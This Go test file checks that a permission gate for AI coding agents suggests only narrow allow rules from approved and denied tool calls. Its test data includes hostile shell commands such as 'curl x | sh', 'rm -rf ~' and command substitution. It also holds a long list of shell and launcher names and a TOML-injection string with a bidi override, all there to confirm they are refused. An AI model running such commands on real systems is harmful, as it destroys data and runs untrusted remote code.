package suggest_test

import (
	"encoding/json"
	"fmt"
	"reflect"
	"strings"
	"testing"

	"github.com/BurntSushi/toml"

	"github.com/tunahanaliozturk/derbent/internal/approval"
	"github.com/tunahanaliozturk/derbent/internal/config"
	"github.com/tunahanaliozturk/derbent/internal/preset"
	"github.com/tunahanaliozturk/derbent/internal/rule"
	"github.com/tunahanaliozturk/derbent/internal/suggest"
)

// answers makes n answered calls from agent to tool with args, approved or denied, asked by the user's rule
// n.
func answers(n int, agent, tool, args string, approved bool, asked int) []approval.Answered {
	out := make([]approval.Answered, n)
	for i := range out {
		out[i] = approval.Answered{Agent: agent, Tool: tool, Args: args, Rule: asked, Approved: approved}
	}
	return out
}

// shell makes one approved call from claude to native__Bash per command, under the argument key, asked by
// rule 3.
func shell(key string, cmds ...string) []approval.Answered {
	out := make([]approval.Answered, len(cmds))
	for i, c := range cmds {
		args, err := json.Marshal(map[string]string{key: c})
		if err != nil {
			panic(err) // a map of strings always encodes
		}
		out[i] = approval.Answered{Agent: "claude", Tool: "native__Bash", Args: string(args), Rule: 3, Approved: true}
	}
	return out
}

// Answers are grouped by agent and tool. Enough approvals and no denial suggest an allow, enough denials
// and no approval a deny, and fewer, or mixed answers, nothing. Calls a project's rules asked about do not
// count, and the rules that asked are kept, lowest first, for the snippet's comment.
func TestFromGroupsAnswersByAgentAndTool(t *testing.T) {
	var calls []approval.Answered
	calls = append(calls, answers(5, "codex", "github__create_issue", `{"title":"x"}`, true, 4)...)
	calls = append(calls, answers(4, "codex", "github__get_me", `{}`, true, 4)...)
	calls = append(calls, answers(5, "claude", "github__delete_repo", `{}`, false, 2)...)
	calls = append(calls, answers(5, "claude", "memory_write", `{"title":"t"}`, true, 1)...)
	calls = append(calls, answers(1, "claude", "memory_write", `{"title":"t"}`, false, 1)...)
	project := answers(6, "codex", "github__merge_pull_request", `{}`, true, 1)
	for i := range project {
		project[i].ProjectRule = true
	}
	calls = append(calls, project...)
	calls = append(calls, answers(1, "codex", "github__create_issue", `{"title":"y"}`, true, 7)...)
	want := []suggest.Suggestion{
		{Agent: "claude", Tool: "github__delete_repo", Action: rule.Deny, Denied: 5, Rules: []int{2}},
		{Agent: "codex", Tool: "github__create_issue", Action: rule.Allow, Approved: 6, Rules: []int{4, 7}},
	}
	if got := suggest.From(calls, suggest.Min); !reflect.DeepEqual(got, want) {
		t.Fatalf("From =\n%+v\nwant\n%+v", got, want)
	}
	if got := suggest.From(calls, 4); len(got) != 3 || got[2].Tool != "github__get_me" {
		t.Fatalf("From with 4 = %+v, want github__get_me too, last", got)
	}
}

// A suggestion never lets through more than the answered commands start with, and a shell whose commands
// cannot all be read gets none. Taken as it is, the common start would give a wider rule where it holds a
// wildcard, a broken pattern where it ends inside a UTF-8 character, a pattern no real call matches where it
// holds redacted text, and a harder one to read where it ends inside a word; a call whose command hides
// behind a masked or differently written key, or is missing, would make the tool look like no shell at all.
func TestSuggestionsNeverWiden(t *testing.T) {
	arrayCall := shell("command", "go test ./...")[0]
	arrayCall.Args = `{"command":["go","test"]}`
	noCommand := shell("command", "go test ./...")[0]
	noCommand.Args = `{"description":"run the tests"}`
	four := shell("command", "go test ./a", "go test ./b", "go test ./c", "go test ./d")
	token := "curl -H 'Authorization: Bearer [redacted]' https://api.example.com/"
	for _, tc := range []struct {
		name        string
		calls       []approval.Answered
		key, prefix string // no prefix: no suggestion
	}{
		{"the same command", shell("command", "npm test", "npm test", "npm test", "npm test", "npm test"), "command", "npm test"},
		{"a word cut in two", shell("command", "go vet ./status", "go vet ./stash", "go vet ./status", "go vet ./stash", "go vet ./status"), "command", "go vet "},
		{"a star in the commands", shell("command", "go test a*b x", "go test a*b y", "go test a*b x", "go test a*b y", "go test a*b x"), "command", "go test "},
		{"a star in the same command", shell("command", "ls -l *.go", "ls -l *.go", "ls -l *.go", "ls -l *.go", "ls -l *.go"), "command", "ls -l "},
		{"a question mark in the commands", shell("command", "ls -l ?x", "ls -l ?y", "ls -l ?x", "ls -l ?y", "ls -l ?x"), "command", "ls -l "},
		{"a UTF-8 character cut in two", shell("command", "git log héllo", "git log hèllo", "git log héllo", "git log hèllo", "git log héllo"), "command", "git log "},
		{"white space only", shell("command", " ls", " cd", " ls", " cd", " ls"), "", ""},
		{"nothing shared", shell("command", "ls", "cd x", "ls", "cd x", "ls"), "", ""},
		{"Antigravity CLI's key", shell("CommandLine", "terraform plan", "terraform plan", "terraform plan", "terraform plan", "terraform plan"), "CommandLine", "terraform plan"},
		{"a command that is not a string", append(four, arrayCall), "", ""},
		{"a shell call without a command", append(shell("command", "go test ./a", "go test ./b", "go test ./c", "go test ./d"), noCommand), "", ""},
		{"a masked key", answers(5, "claude", "native__Bash", `{"[redacted]":"git status"}`, true, 3), "", ""},
		{"a key written in other case", shell("Command", "git status", "git status", "git status", "git status", "git status"), "", ""},
		{"both keys across calls", append(shell("command", "go test ./a", "go test ./b", "go test ./c"), shell("CommandLine", "go test ./d", "go test ./e")...), "", ""},
		{"both keys in one call", answers(5, "claude", "native__Bash", `{"CommandLine":"go test ./a","command":"go test ./a"}`, true, 3), "", ""},
		{"redacted text in the commands", shell("command", token+"a", token+"b", token+"a", token+"b", token+"a"), "command", "curl -H 'Authorization: Bearer "},
		{"redacted text inside a word", shell("command", "git clone https://[redacted]@x/a", "git clone https://[redacted]@x/a", "git clone https://[redacted]@x/a", "git clone https://[redacted]@x/a", "git clone https://[redacted]@x/a"), "command", "git clone "},
		{"redacted text only", shell("command", "[redacted] a", "[redacted] b", "[redacted] a", "[redacted] b", "[redacted] a"), "", ""},
	} {
		got := suggest.From(tc.calls, suggest.Min)
		switch {
		case tc.prefix == "" && len(got) != 0:
			t.Errorf("%s: suggested %+v, want nothing", tc.name, got)
		case tc.prefix != "" && (len(got) != 1 || got[0].Key != tc.key || got[0].Prefix != tc.prefix):
			t.Errorf("%s: %+v, want %s = %q followed by *", tc.name, got, tc.key, tc.prefix)
		}
	}
	// A shell operator in the start makes whatever follows it a command of its own: a whole shell in all
	// but name. Each command is answered five times as it is, so it would be suggested as it is, and the
	// same checks refuse it.
	for _, c := range []string{
		"cd /work/shop && go test", "go vet; go test", "go test | tee log", "make || true", "sleep 1 & go test",
		"echo `id`", "echo $(id)", "go vet\ngo test", "go vet\r\ngo test",
	} {
		if got := suggest.From(shell("command", c, c, c, c, c), suggest.Min); len(got) != 0 {
			t.Errorf("%q: suggested %+v, want nothing", c, got)
		}
	}
	// A rule cannot match a tool name with a wildcard as written, an agent label no gate writes, or an
	// empty name.
	for _, name := range [][2]string{{"claude", "native__B*sh"}, {"cl?ude", "native__Bash"}, {"Claude", "native__Bash"}, {"", "native__Bash"}, {"claude", ""}} {
		if got := suggest.From(answers(5, name[0], name[1], `{}`, true, 1), suggest.Min); len(got) != 0 {
			t.Errorf("agent %q, tool %q: suggested %+v, want nothing", name[0], name[1], got)
		}
	}
}

// A shell is known by its name as well as by its keys: a call to one of the CLIs' shell tools whose command
// cannot be read, because its arguments are {} or null, name no command, or hide it behind a masked or
// differently written key, gives its group no suggestion, never an allow for the whole shell. Copilot CLI's
// write_bash and write_powershell type text into a running shell and never get one.
func TestAShellIsKnownByItsName(t *testing.T) {
	for _, tool := range []string{"native__Bash", "native__bash", "native__PowerShell", "native__powershell", "native__Monitor", "native__run_command"} {
		for _, args := range []string{`{}`, `null`, `{"description":"x"}`, `{"[redacted]":"go test ./a"}`, `{"COMMAND":"go test ./a"}`} {
			if got := suggest.From(answers(5, "claude", tool, args, true, 3), suggest.Min); len(got) != 0 {
				t.Errorf("%s with %s: suggested %+v, want nothing", tool, args, got)
			}
		}
	}
	for _, tool := range []string{"native__write_bash", "native__write_powershell"} {
		for _, args := range []string{`{"input":"ls"}`, `{"command":"go test ./a"}`} {
			if got := suggest.From(answers(5, "copilot", tool, args, true, 3), suggest.Min); len(got) != 0 {
				t.Errorf("%s with %s: suggested %+v, want nothing", tool, args, got)
			}
		}
	}
}

// A prefix that names a shell, an interpreter or a launcher in any of its words, however the word is
// spelled, is refused: whatever the * adds would run as a command of its own. So is a prefix of one word,
// since `git *`, `find *`, `make *`, `npm *`, `docker *`, `rsync *` and `tar *` each run any command
// through an option, a prefix that holds an operator, and one whose words could name any program. Each
// command is answered as it is, and with two different endings, so both the exact command and the prefix
// are checked.
func TestPrefixesThatRunAnyCommandAreRefused(t *testing.T) {
	for _, p := range []string{
		// Shells, interpreters and launchers, one row each, in the first word or a later one.
		"sh run", "/bin/bash run", "zsh run", "dash run", "ksh run", "csh run", "tcsh run", "fish run", "busybox run",
		"pwsh run", "PowerShell.exe run", "CMD.EXE run", "wsl run", "python3.12 a.py", "py run", "node run",
		"deno run", "bun run", "perl run", "ruby run", "php run", "lua run", "Rscript run", "osascript run",
		"awk run", "gawk run", "mawk run", "tclsh8.6 run", "expect run", `\sudo run`, "doas run", "su run",
		"runas run", "gsudo run", "pkexec run", "/usr/bin/env run", "xargs run", "eval run", "exec run",
		"command run", "builtin run", ". ./env.sh", "source run", "nohup run", "nice run", "ionice run",
		"chrt run", "taskset run", "time run", "timeout 5", "watch run", "setsid run", "stdbuf run", "flock run",
		"script run", "unshare run", "nsenter run", "chroot run", "systemd-run run", "ssh run", "npx run",
		"bunx run", "pnpx run", "uvx run", "pipx run", "start run", "Start-Process run", "Invoke-Expression run",
		"iex run", "Invoke-Command run", "call run", "mshta run", "rundll32 run", "cscript run", "wscript run",
		"go env", "go 'bash'", `go "node"`,
		// The brief's spellings.
		"/bin/sh -c", "FOO=1 sh -c", `C:\Windows\System32\cmd.exe /c`, "nice sudo sh -c",
		// Words that could name any program: a variable, a quote inside a word, an escaped letter, a
		// glob, a brace expansion and cmd's caret.
		"$HOME/tool run", "%COMSPEC% /c", "s''h -c", `s\h -c`, "/bin/[s]h -c", "{sh,-c,id} run", "c^m^d /c",
		// One word, also after an assignment.
		"git", "find", "make", "npm", "docker", "rsync", "tar", "FOO=1 git",
		// Operators, redirects and PowerShell's (…), which runs what it holds.
		"echo a > f", "diff <( a )", "sort < f", "go test (Remove-Item x)", "echo a; echo", "echo a && echo",
		"echo a | cat", "echo `id`", "echo $(id)",
	} {
		for _, calls := range [][]approval.Answered{
			shell("command", p, p, p, p, p),
			shell("command", p+" a", p+" b", p+" a", p+" b", p+" a"),
		} {
			if got := suggest.From(calls, suggest.Min); len(got) != 0 {
				t.Errorf("%q: suggested %+v, want nothing", calls[1].Args, got)
			}
		}
	}
	// A prefix that ends in $ or \ would join what the * adds to its last word.
	for _, cmds := range [][2]string{{`echo x\`, `echo x\ y`}, {`go test x$`, `go test x$ y`}} {
		if got := suggest.From(shell("command", cmds[0], cmds[1], cmds[0], cmds[1], cmds[0]), suggest.Min); len(got) != 0 {
			t.Errorf("%q: suggested %+v, want nothing", cmds, got)
		}
	}
	for _, tc := range []struct {
		calls  []approval.Answered
		prefix string
		exact  bool
	}{
		{shell("command", "git status --short", "git status --short", "git status --short", "git status --short", "git status --short"), "git status --short", true},
		{shell("command", "go test ./internal/a", "go test ./internal/b", "go test ./internal/a", "go test ./internal/b", "go test ./internal/a"), "go test ", false},
	} {
		if got := suggest.From(tc.calls, suggest.Min); len(got) != 1 || got[0].Prefix != tc.prefix || got[0].Exact != tc.exact {
			t.Errorf("%s: %+v, want %q, exact %v", tc.calls[1].Args, got, tc.prefix, tc.exact)
		}
	}
}

// When every answered command is the same, the snippet allows that command and nothing else. Otherwise it
// allows the start they share followed by *, with an ask above it for each operator that would chain,
// pipe, redirect or substitute another command after that start. Pasted above the rule that asked in the
// balanced preset, it allows a push with more options, as its comment says, while a push that runs
// another command is still asked about, by one of those asks.
func TestAShellAllowAsksAboutWhatFollows(t *testing.T) {
	same := suggest.From(shell("command", "go test ./...", "go test ./...", "go test ./...", "go test ./...", "go test ./..."), suggest.Min)
	if len(same) != 1 || !same[0].Exact || !strings.Contains(same[0].TOML(), "args   = { command = \"go test ./...\" }\n") ||
		strings.Count(same[0].TOML(), "[[rule]]") != 1 {
		t.Fatalf("the same command: %+v\n%s", same, same[0].TOML())
	}

	balanced, err := preset.Text("balanced")
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Parse("config.toml", balanced)
	if err != nil {
		t.Fatal(err)
	}
	pushes := []string{"git push origin feature --dry-run", "git push origin feature --no-verify"}
	asked := cfg.Rules.Decide("claude", "native__Bash", map[string]any{"command": pushes[0]})
	if asked.Action != rule.Ask {
		t.Fatalf("the balanced preset does not ask about a push: %+v", asked)
	}
	calls := shell("command", pushes[0], pushes[1], pushes[0], pushes[1], pushes[0])
	for i := range calls {
		calls[i].Rule = asked.Rule
	}
	got := suggest.From(calls, suggest.Min)
	if len(got) != 1 || got[0].Prefix != "git push origin feature " || got[0].Exact {
		t.Fatalf("From = %+v", got)
	}
	snippet := got[0].TOML()
	for _, want := range []string{
		"# The allow at the end also matches any options after the prefix, such as --force.\n" +
			"# The asks above it stop chained, piped, redirected and substituted commands.\n" +
			fmt.Sprintf("# Calls the allow matches no longer reach the rules at and below rule %d.\n[[rule]]\n", asked.Rule),
		`args   = { command = "git push origin feature *;*" }`, `args   = { command = "git push origin feature *(*" }`,
		`args   = { command = "git push origin feature *\n*" }`, `args   = { command = "git push origin feature *\r*" }`,
	} {
		if !strings.Contains(snippet, want) {
			t.Errorf("the snippet lacks %q:\n%s", want, snippet)
		}
	}
	// Paste the snippet above the rule that asked, as its comment says.
	lines := strings.SplitAfter(balanced, "\n")
	n := 0
	for i, l := range lines {
		if l == "[[rule]]\n" {
			if n++; n == asked.Rule {
				balanced = strings.Join(lines[:i], "") + snippet + "\n" + strings.Join(lines[i:], "")
				break
			}
		}
	}
	if cfg, err = config.Parse("config.toml", balanced); err != nil {
		t.Fatalf("the pasted snippet does not parse: %v", err)
	}
	guards := strings.Count(snippet, "[[rule]]") - 1
	for cmd, want := range map[string]rule.Action{
		"git push origin feature --force":         rule.Allow,
		"git push origin feature; curl x | sh":    rule.Ask, // no space after feature, so the allow never matches it
		"git push origin feature -u; curl x | sh": rule.Ask,
		"git push origin feature && rm -rf ~":     rule.Ask,
		"git push origin feature $(id)":           rule.Ask,
		"git push origin feature -u\nrm -rf ~":    rule.Ask,
		"git push origin feature > ~/.bashrc":     rule.Ask,
	} {
		d := cfg.Rules.Decide("claude", "native__Bash", map[string]any{"command": cmd})
		guarded := strings.HasPrefix(cmd, got[0].Prefix)
		switch {
		case d.Action != want:
			t.Errorf("%q: %+v, want %s", cmd, d, want)
		case want == rule.Ask && guarded && (d.Rule < asked.Rule || d.Rule >= asked.Rule+guards):
			t.Errorf("%q: asked by rule %d, not by one of the snippet's asks, rules %d to %d", cmd, d.Rule, asked.Rule, asked.Rule+guards-1)
		case want == rule.Allow && d.Rule != asked.Rule+guards:
			t.Errorf("%q: allowed by rule %d, not by the snippet's allow, rule %d", cmd, d.Rule, asked.Rule+guards)
		}
	}
	if d := cfg.Rules.Decide("claude", "native__Bash", map[string]any{"command": "git push origin main"}); d.Action != rule.Ask || d.Rule != asked.Rule+guards+1 {
		t.Errorf("a push outside the prefix: %+v, want the rule that asked before, now rule %d", d, asked.Rule+guards+1)
	}
}

// An allow for a tool that is not a shell lets every call through, whatever its arguments, and its snippet
// says so; a deny, or a shell's exact command, needs no such line.
func TestAWholeToolAllowSaysWhatItLetsThrough(t *testing.T) {
	got := suggest.From(answers(5, "claude", "native__Write", `{"file_path":"a.go"}`, true, 12), suggest.Min)
	want := "# This allows every call to native__Write, whatever its arguments; the rules at and below rule 12 no longer see them.\n"
	if len(got) != 1 || !strings.Contains(got[0].TOML(), want) {
		t.Fatalf("From = %+v, want a snippet with %q", got, want)
	}
	deny := suggest.From(answers(5, "claude", "github__delete_repo", `{}`, false, 2), suggest.Min)
	if len(deny) != 1 || strings.Contains(deny[0].TOML(), "allows every call") {
		t.Fatalf("a deny: %+v", deny)
	}
}

// A snippet parses with the config parser and reads back the agent, the tool and the pattern as they were,
// whatever quotes, backslashes, newlines or invisible characters the tool name holds, and decides as
// suggested: the answered command, the same each time, is allowed as it is, and another command still asks.
func TestSnippetsReadBackAsWritten(t *testing.T) {
	tool := "native__Say \"hi\"\\\n[[rule]]\naction = \"allow\"\u202e"
	got := suggest.From(answers(5, "claude", tool, `{"command":"git status --short"}`, true, 1), suggest.Min)
	if len(got) != 1 {
		t.Fatalf("From = %+v", got)
	}
	snippet := got[0].TOML()
	if strings.ContainsRune(snippet, '\u202e') || strings.Count(snippet, "\n[[rule]]\n") != 1 {
		t.Fatalf("the snippet holds raw text from the tool name:\n%s", snippet)
	}
	cfg, err := config.Parse("config.toml", snippet+"\n[[rule]]\naction = \"ask\"\n")
	if err != nil {
		t.Fatalf("the snippet does not parse: %v\n%s", err, snippet)
	}
	if d := cfg.Rules.Decide("claude", tool, map[string]any{"command": "git status --short"}); d.Action != rule.Allow || d.Rule != 1 {
		t.Fatalf("the answered command: %+v", d)
	}
	if d := cfg.Rules.Decide("claude", tool, map[string]any{"command": "rm -rf ."}); d.Action != rule.Ask {
		t.Fatalf("a command outside the prefix: %+v", d)
	}
	for _, want := range []string{
		"# claude's native__Say", "approved 5 times and never denied.\n",
		"# Put it above rule 1 in your config, so first match reaches it before rule 1, which asked.\n",
		"args   = { command = \"git status --short\" }\n", "action = \"allow\"\n",
	} {
		if !strings.Contains(snippet, want) {
			t.Errorf("the snippet lacks %q:\n%s", want, snippet)
		}
	}
}

// hostile holds what could end a TOML string or line early, start a table, or reach a terminal raw: a
// quote, a backslash, a newline, a carriage return, a tab, a table header, an escape sequence with a bell,
// a bidirectional override, a zero-width space, a tag character, DEL and a C1 control.
const hostile = "a\"b\\c\nd\r\te[[rule]]\naction = \"allow\"\x1b]0;x\x07\u202e\u200b\U000e0041\x7f\u0085"

// Every string a snippet holds, the agent label, the tool name and the command prefix, reads back as it
// was, and none of them adds a line, a table or a raw control character to the snippet. No gate writes
// such an agent label, but the database is a file anyone can write.
func TestSnippetStringsCannotBreakOut(t *testing.T) {
	s := suggest.Suggestion{Agent: hostile, Tool: hostile, Action: rule.Deny, Key: "command", Prefix: hostile, Denied: 5, Rules: []int{2, 9}}
	snippet := s.TOML()
	if strings.Count(snippet, "\n") != 7 || strings.ContainsAny(snippet, "\r\t\x1b\x07\u202e\u200b\U000e0041\x7f\u0085") {
		t.Fatalf("the snippet has lines or raw runes of its own:\n%q", snippet)
	}
	var file struct {
		Rule []rule.Spec `toml:"rule"`
	}
	if _, err := toml.Decode(snippet, &file); err != nil {
		t.Fatalf("the snippet does not decode: %v\n%q", err, snippet)
	}
	want := []rule.Spec{{Agent: hostile, Tool: hostile, Args: map[string]string{"command": hostile + "*"}, Action: rule.Deny}}
	if !reflect.DeepEqual(file.Rule, want) {
		t.Fatalf("the snippet reads back as\n%q\nwant\n%q", file.Rule, want)
	}
	if !strings.Contains(snippet, "so first match reaches it before rules 2 and 9, which asked.\n") {
		t.Errorf("the snippet names the rules that asked wrongly:\n%s", snippet)
	}

	// Through From and the config parser, a command holding such text is allowed as it was answered. It
	// has no line break, shell operator, quote inside a word or [, which would give no suggestion at all.
	cmd := "echo \"b\\c\" action = \"allow\"\t\x1b]0x\x07\u202e\u200b\U000e0041\x7f\u0085"
	got := suggest.From(shell("command", cmd, cmd, cmd, cmd, cmd), suggest.Min)
	if len(got) != 1 || got[0].Prefix != cmd {
		t.Fatalf("From = %+v", got)
	}
	cfg, err := config.Parse("config.toml", got[0].TOML()+"\n[[rule]]\naction = \"ask\"\n")
	if err != nil {
		t.Fatalf("the snippet does not parse: %v\n%s", err, got[0].TOML())
	}
	if d := cfg.Rules.Decide("claude", "native__Bash", map[string]any{"command": cmd}); d.Action != rule.Allow || d.Rule != 1 {
		t.Fatalf("the answered command: %+v", d)
	}
	if d := cfg.Rules.Decide("claude", "native__Bash", map[string]any{"command": "a\"b"}); d.Action != rule.Ask {
		t.Fatalf("a command outside the prefix: %+v", d)
	}
}
